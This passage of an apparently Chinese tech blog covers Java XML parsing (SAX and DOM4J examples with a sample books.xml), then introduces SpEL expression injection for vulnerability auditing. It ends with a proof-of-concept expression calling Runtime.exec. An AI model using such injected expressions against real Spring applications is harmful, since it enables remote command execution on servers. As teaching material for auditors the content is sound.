class="keyword">public</span> String <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> price;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(String price)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.price = price;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> title;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTitle</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.title = title;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Book [name="</span> + name + <span class="string">", author="</span> + author + <span class="string">", price="</span> + price + <span class="string">", age="</span> + age + <span class="string">", title="</span> + title</span><br><span class="line">				+ <span class="string">"]"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="books-xml文件"><a href="#books-xml文件" class="headerlink" title="books.xml文件"></a>books.xml文件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>浪潮之巅<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>吴军<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>50<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">age</span>&gt;</span>50<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>数学之美<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span> <span class="attr">title</span>=<span class="string">'ADS'</span>&gt;</span>陆奇<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>29<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">age</span>&gt;</span>50<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="测试的主类："><a href="#测试的主类：" class="headerlink" title="测试的主类："></a>测试的主类：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xml.sax.Attributes;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. 要用sax解析xml文档 需要自己去实现一个事件处理器</span></span><br><span class="line"><span class="comment"> * 2. 事件处理器会有一些事件的callback函数，需要我们去重写</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liangjie</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaxHanlder</span> <span class="keyword">extends</span> <span class="title">DefaultHandler</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 用来标识区分相同标签的节点</span></span><br><span class="line">	<span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">	<span class="keyword">int</span> booknum = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 集合用来存放book对象</span></span><br><span class="line">	ArrayList&lt;Book&gt; booklist = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	Book book;</span><br><span class="line">	<span class="comment">// 全局变量用来记录每一次查找解析到的标签 方便清空</span></span><br><span class="line">	String previousTagName;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 1. startElement(String uri,String localName,String qName,Attributes attributes)</span></span><br><span class="line"><span class="comment">	 * 2. qName - 限定的名称（带有前缀），如果限定的名称不可用，则为空字符串。 attributes - 元素的属性。如果没有属性，则它将是空的</span></span><br><span class="line"><span class="comment">	 * 3. Attributes 对象</span></span><br><span class="line"><span class="comment">	 * 4. 每解析到 一个元素（element）的时候都会触发这个函数，并且将这个element的属性attributes和值value当作参数传进来</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">		<span class="comment">// 找到第二本book的name</span></span><br><span class="line">		<span class="keyword">if</span> (qName.equals(<span class="string">"name"</span>)) &#123;</span><br><span class="line">			booknum++;</span><br><span class="line">			<span class="keyword">if</span> (booknum == <span class="number">2</span>) &#123;</span><br><span class="line">				flag = <span class="keyword">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 找到了“book”开始标签</span></span><br><span class="line">		<span class="keyword">if</span> (qName.equals(<span class="string">"book"</span>)) &#123;<span class="comment">// 创建对象 准备接收其属性</span></span><br><span class="line">			book = <span class="keyword">new</span> Book();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equals(<span class="string">"author"</span>)) &#123;</span><br><span class="line">			<span class="comment">// 获取title属性</span></span><br><span class="line">			String value = attributes.getValue(<span class="string">"title"</span>);</span><br><span class="line">			<span class="keyword">if</span> (book != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="comment">// 设置title</span></span><br><span class="line">				book.setTitle(value);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 本次查找完成 需要的属性值已经传给对象</span></span><br><span class="line">		previousTagName = qName;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 当解析到一个元素标签的结束的时候 会调用</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String uri, String localName, String qName)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">		<span class="comment">// System.out.println("endElement: "+qName);</span></span><br><span class="line">		<span class="comment">// 找到了“book”结束标签</span></span><br><span class="line">		<span class="keyword">if</span> (qName.equals(<span class="string">"book"</span>)) &#123;<span class="comment">// 把book对象加入集合中 同时并将其清空 用于下一次查找</span></span><br><span class="line">			booklist.add(book);</span><br><span class="line">			book = <span class="keyword">null</span>;</span><br><span class="line">		&#125; <span class="comment">// 本标签内的查找 结束 清空tag</span></span><br><span class="line">		previousTagName = <span class="string">""</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 当解析到一个文本节点的时候会调用</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">characters</span><span class="params">(<span class="keyword">char</span>[] ch, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (flag) &#123;<span class="comment">// 找到了第二个name节点 获取其内容</span></span><br><span class="line">			System.out.println(<span class="string">"文本节点："</span> + <span class="keyword">new</span> String(ch, start, length));</span><br><span class="line">			flag = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取文本节点内容</span></span><br><span class="line">		String text = <span class="keyword">new</span> String(ch, start, length);</span><br><span class="line">		<span class="keyword">switch</span> (previousTagName) &#123;</span><br><span class="line">		<span class="comment">// 标签值如果匹配&lt;name&gt; 把name标签的文本内容传给book对象</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">"name"</span>:</span><br><span class="line">			book.setName(text);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"author"</span>:</span><br><span class="line">			book.setAuthor(text);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"price"</span>:</span><br><span class="line">			book.setPrice(text);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"age"</span>:</span><br><span class="line">			<span class="comment">// 标签匹配age text中存的是字符串</span></span><br><span class="line">			book.setAge(Integer.parseInt(text));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 当解析到一个document文档的开始的时候会调用</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"startDocument:"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 当解析到一个document文档的结尾的时候 会调用</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endDocument</span><span class="params">()</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">		System.out.println(<span class="string">"endDocument:"</span> + booklist);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception, SAXException </span>&#123;</span><br><span class="line">		<span class="comment">// 使用SAXParseFactory创建解析工厂</span></span><br><span class="line">		SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">		<span class="comment">// 通过SAX解析工厂得到解析器对象</span></span><br><span class="line">		SAXParser sp = spf.newSAXParser();</span><br><span class="line">		<span class="comment">// 通过解析器对象得到一个XML的读取器</span></span><br><span class="line">		XMLReader xmlReader = sp.getXMLReader();</span><br><span class="line">		<span class="comment">// 设置读取器的事件处理器</span></span><br><span class="line">		xmlReader.setContentHandler(<span class="keyword">new</span> SaxHanlder());</span><br><span class="line">		<span class="comment">// 解析xml文件</span></span><br><span class="line">		xmlReader.parse(<span class="string">"./src/com/unctf/demo/books.xml"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="DOM4J-是第三方提供的解析XML方法，需要dom4j-1-6-1-jar包"><a href="#DOM4J-是第三方提供的解析XML方法，需要dom4j-1-6-1-jar包" class="headerlink" title="DOM4J 是第三方提供的解析XML方法，需要dom4j-1.6.1.jar包"></a>DOM4J 是第三方提供的解析XML方法，需要dom4j-1.6.1.jar包</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.dom4j.Attribute;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.Document;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.DocumentException;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.Element;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dom4jTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Document document = reader.read(<span class="keyword">new</span> File(<span class="string">"book.xml"</span>));</span><br><span class="line">            Element bookStore = document.getRootElement();</span><br><span class="line">            Iterator it = bookStore.elementIterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                System.out.println(<span class="string">"begin"</span>);</span><br><span class="line">                Element book = (Element) it.next();</span><br><span class="line">                List&lt;Attribute&gt; bookAttrs = book.attributes();</span><br><span class="line">                <span class="keyword">for</span> (Attribute attr : bookAttrs) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"属性名"</span> + attr.getName() + <span class="string">"属性值"</span> + attr.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//解析子节点</span></span><br><span class="line">                Iterator iterator = book.elementIterator();</span><br><span class="line">                <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">                    Element bookChild = (Element) iterator.next();</span><br><span class="line">                    System.out.println(<span class="string">"节点名："</span> + bookChild.getName() + <span class="string">"节点值"</span> + bookChild.getStringValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (DocumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="XML四种解析方式性能测试："><a href="#XML四种解析方式性能测试：" class="headerlink" title="XML四种解析方式性能测试："></a>XML四种解析方式性能测试：</h4><h5 id="SAX-gt-DOM-gt-DOM4J-gt-JDOM"><a href="#SAX-gt-DOM-gt-DOM4J-gt-JDOM" class="headerlink" title="SAX&gt;DOM&gt;DOM4J&gt;JDOM"></a>SAX&gt;DOM&gt;DOM4J&gt;JDOM</h5><h5 id="JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main-入口进行测试。"><a href="#JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main-入口进行测试。" class="headerlink" title="JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main()入口进行测试。"></a>JUnit是Java提供的一种进行单元测试的自动化工具。测试方法可以写在任意类中的任意位置。使用JUnit可以没有main()入口进行测试。</h5><h5 id="DOM4J在灵活性和对复杂xml的支持上都要强于DOM"><a href="#DOM4J在灵活性和对复杂xml的支持上都要强于DOM" class="headerlink" title="DOM4J在灵活性和对复杂xml的支持上都要强于DOM"></a>DOM4J在灵活性和对复杂xml的支持上都要强于DOM</h5><h5 id="DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。"><a href="#DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。" class="headerlink" title="DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。"></a>DOM4J的应用范围非常的广，例如在三大框架的Hibernate中是使用DOM4J的方式解析文件的。</h5><h5 id="DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。"><a href="#DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。" class="headerlink" title="DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。"></a>DOM是w3c组织提供的一个官方解析方式，在一定程度上是有所应用的。</h5><h5 id="当XML文件比较大的时候，会发现DOM4J比较好用"><a href="#当XML文件比较大的时候，会发现DOM4J比较好用" class="headerlink" title="当XML文件比较大的时候，会发现DOM4J比较好用"></a>当XML文件比较大的时候，会发现DOM4J比较好用</h5><h5 id="多使用dom4j"><a href="#多使用dom4j" class="headerlink" title="多使用dom4j"></a>多使用dom4j</h5><h4 id="第四个遇到在好好研究了。"><a href="#第四个遇到在好好研究了。" class="headerlink" title="第四个遇到在好好研究了。"></a>第四个遇到在好好研究了。</h4><h4 id="SpEL表达式注入"><a href="#SpEL表达式注入" class="headerlink" title="SpEL表达式注入"></a>SpEL表达式注入</h4><h4 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h4><h6 id="Spring-Expression-Language是一种强大的表达式语言-Spring开发中经常会用到。正是因为功能强大-导致在某些情况下-用户可从外部注入SpEl表达式-导致命令执行。"><a href="#Spring-Expression-Language是一种强大的表达式语言-Spring开发中经常会用到。正是因为功能强大-导致在某些情况下-用户可从外部注入SpEl表达式-导致命令执行。" class="headerlink" title="Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。"></a>Spring Expression Language是一种强大的表达式语言,Spring开发中经常会用到。正是因为功能强大,导致在某些情况下,用户可从外部注入SpEl表达式,导致命令执行。</h6><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><h6 id="SpEl表达式有3种用法-Value、xml配置、代码块中使用Expression。在漏洞审计过程中-主要关注Expression这种情况-另外两种情况一般都是写死的-攻击者不可控"><a href="#SpEl表达式有3种用法-Value、xml配置、代码块中使用Expression。在漏洞审计过程中-主要关注Expression这种情况-另外两种情况一般都是写死的-攻击者不可控" class="headerlink" title="SpEl表达式有3种用法,@Value、xml配置、代码块中使用Expression。在漏洞审计过程中,主要关注Expression这种情况,另外两种情况一般都是写死的,攻击者不可控"></a>SpEl表达式有3种用法,@Value、xml配置、代码块中使用Expression。在漏洞审计过程中,主要关注Expression这种情况,另外两种情况一般都是写死的,攻击者不可控</h6><h5 id="value"><a href="#value" class="headerlink" title="@value"></a>@value</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@value(&quot;#&#123;表达式&#125;&quot;)</span><br><span class="line">public String org;</span><br></pre></td></tr></table></figure>

<h5 id="xml配置-jackson的CVE-2017-17485构造恶意xml文件就是这种方式"><a href="#xml配置-jackson的CVE-2017-17485构造恶意xml文件就是这种方式" class="headerlink" title="xml配置(jackson的CVE-2017-17485构造恶意xml文件就是这种方式)"></a>xml配置(jackson的CVE-2017-17485构造恶意xml文件就是这种方式)</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Bean1"</span> <span class="attr">class</span>=<span class="string">"com.test.xxx"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"arg"</span> <span class="attr">value</span>=<span class="string">"#&#123;表达式&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="代码块中使用Expression"><a href="#代码块中使用Expression" class="headerlink" title="代码块中使用Expression"></a>代码块中使用Expression</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//创建ExpressionParser解析表达式</span></span><br><span class="line">        ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        <span class="comment">//放置表达式</span></span><br><span class="line">        Expression expression = parser.parseExpression(<span class="string">"$&#123;123&#125;"</span>);</span><br><span class="line">        <span class="comment">//执行表达式,默认容器是spring本身容器:ApplicationContext</span></span><br><span class="line">        Object obj = expression.getValue();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用其他容器方法</span></span><br><span class="line">        <span class="comment">//创建虚拟容器StandardEvaluationContext</span></span><br><span class="line">        StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">        <span class="comment">//向容器内添加Bean</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        context.setVariable(<span class="string">"bean_id"</span>,user);</span><br><span class="line">        <span class="comment">//执行表达式</span></span><br><span class="line">        Object obj2 = expression.getValue(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SpEL工作流程"><a href="#SpEL工作流程" class="headerlink" title="SpEL工作流程"></a>SpEL工作流程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.定义解析器ExpressionParser,Spring中默认为SpelExpressionParser			</span><br><span class="line">2.调用解析器的parseExpression()方法将传入字符串转为Expression对象				</span><br><span class="line">3.(这一步可选)定义上下文,SpEL使用接口EvaluationContext,如果不创建,默认为Spring容器ApplicationContext				</span><br><span class="line">4.执行setValue()或getValue()求值</span><br></pre></td></tr></table></figure>

<h5 id="语法实例"><a href="#语法实例" class="headerlink" title="语法实例"></a>语法实例</h5><h6 id="除了基本类型表达式，我们需要掌握的是类相关的表达式"><a href="#除了基本类型表达式，我们需要掌握的是类相关的表达式" class="headerlink" title="除了基本类型表达式，我们需要掌握的是类相关的表达式"></a>除了基本类型表达式，我们需要掌握的是类相关的表达式</h6><h5 id="类相关表达式"><a href="#类相关表达式" class="headerlink" title="类相关表达式"></a>类相关表达式</h5><h6 id="使用T-Type-表示Type类的实例-Type为全限定名称-如T-com-test-Bean1-。但是java-lang例外-该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段"><a href="#使用T-Type-表示Type类的实例-Type为全限定名称-如T-com-test-Bean1-。但是java-lang例外-该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段" class="headerlink" title="使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。但是java.lang例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段"></a>使用T(Type)表示Type类的实例,Type为全限定名称,如T(com.test.Bean1)。但是java.lang例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression exp  = parser.parseExpression(<span class="string">"T(java.lang.Runtime).getRuntime().exec(\"mspaint\")"</span>);</span><br><span class="line">Object obj = exp.getValue();</span><br></pre></td></tr></table></figure>

